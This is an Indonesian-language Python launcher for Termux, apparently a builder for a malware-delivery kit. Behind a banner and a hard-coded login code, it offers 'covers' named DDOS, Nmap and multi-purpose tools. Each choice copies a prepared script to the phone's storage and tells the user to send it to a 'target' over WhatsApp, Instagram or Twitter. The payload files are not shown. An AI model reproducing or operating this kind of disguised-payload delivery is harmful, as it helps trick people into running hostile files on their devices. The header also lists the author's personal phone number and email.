'''
Author : Aldi 
Nick : JackLucifer18
WA : 081945885914
Gmail : Aldifortuna18@gmail.com
'''

from os import system
from time import sleep

def Welcome ():
	system ("clear")
	print ("\t\t=============================")
	print ("\t\t|   Author : Aldi           |")
	print ("\t\t|   Nick   : JackLucifer18  |")
	print ("\t\t|   WA     : 081945885914   |")
	print ("\t\t=============================")
	sleep (2)
	system ("cowsay -f dragon-and-cow.cow 'Aldi Fortuna 18' | lolcat")
	system ("figlet -f block.flf 'Jack Lucifer 18' | lolcat")
	sleep (3)
	system ("clear")

def PrivPol():
	system ("figlet -f block.flf 'Script Ini Bersifat Pribadi' | lolcat")
	system ("figlet -f block.flf 'Silahkan Hubungi Aldi, Jika Ingin Memberi Ke Teman Untuk Memberikan Akses' | lolcat")
	sleep (3)
	system ("clear")

def Name():
	system ("figlet -f block.flf 'Selamat Datang Tio' | lolcat")
	
def Running():
	print ("\n\t°•°•°•°•°•°•° PROSES BERJALAN°•°•°•°•°•°•°\n")
	sleep (1)
def Exit():
	print ("\n\t°•°•°•°•°•°•° PROSES BERAKHIR°•°•°•°•°•°•°\n")
def Selesai():
	print ("\n\t°•°•°•°•°•°•° PROSES SELESAI°•°•°•°•°•°•°\n")
	
def Loading():
	print ("Pemuatan Sistem.....")
	sleep(2)
	print ("[                    ] 0% ")
	sleep(5)
	print ("[=====               ] 25%")
	sleep(5)
	print ("[==========          ] 50%")
	sleep(5)
	print ("[===============     ] 75%")
	sleep(5)
	print ("[====================] 100%")
	sleep(3)
	Selesai()
	
	

		
		
#<<<<<<<<<<<<<<<<<<<<Berjalan Tools>>>>>>>>>>>>>>>>>>>
Welcome()
PrivPol()
Name()
sleep (1)
system ("clear")
print ("Jika Ada Pilihan Y / N Silahkan Anda Ketik Y Lalu Enter")
sleep (2)
Running()
system ("pkg update &&pkg upgrade")
system ("pkg install python")
system ("pkg install lolcat")
system ("pkg install figlet")
system ("pkg install cowsay")
Selesai()
sleep (3)
system ('clear')
login = str(input("Setiap Pengguna Memiliki Kode Berbeda Yang Hanya Bisa Didapat Dari Author. \nMasukan Kode Login Anda : "))

#~~~~~~~~kode Login~~~~~~
if login == ("Tio159"):
#~~~~~~~~~~~~~~~~~~~~~~~~
	print ("Login Berhasil")
	Running()
	Loading()
	sampul = int(input("Silahkan Anda Pilih Sampul\n1.DDOS\n2.Nmap\n3.Tools_Serba_Guna\n\nSampul Anda : "))
	if sampul == (1):
		system ('clear')
		Running()
		print ('\n\n')
		Loading()
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack_Tio/VF1/Shadow_Gun.py /sdcard/')
		print ('')
		print('Silahkan Anda Kirim File Baru Yang Berada Di File Manager Anda Tersebut Ke Target\nPengiriman Bisa Lewat Mana Saja, Bisa WA, IG, Twitter, Dll.')
	elif sampul == (2):
		system ('clear')
		Running()
		print ('\n\n')
		Loading()
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack_Tio/VF1/Eye_Shadow.py /sdcard/')
		print ('')
		print('Silahkan Anda Kirim File Baru Yang Berada Di File Manager Anda Tersebut Ke Target\nPengiriman Bisa Lewat Mana Saja, Bisa WA, IG, Twitter, Dll.')
	elif sampul == (3):
		system ('clear')
		Running()
		print ('\n\n')
		Loading()
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack_Tio/VF1/Random_Att.py /sdcard/')
		print ('')
		print('Silahkan Anda Kirim File Baru Yang Berada Di File Manager Anda Tersebut Ke Target\nPengiriman Bisa Lewat Mana Saja, Bisa WA, IG, Twitter, Dll.')
	else:
		Welcome()
		Exit()
		sleep (1)
		system ("exit")
		

else:
	print ("Kode Login Salah")
	Welcome()
	Exit()
	sleep (1)
	system ("exit")
		
		


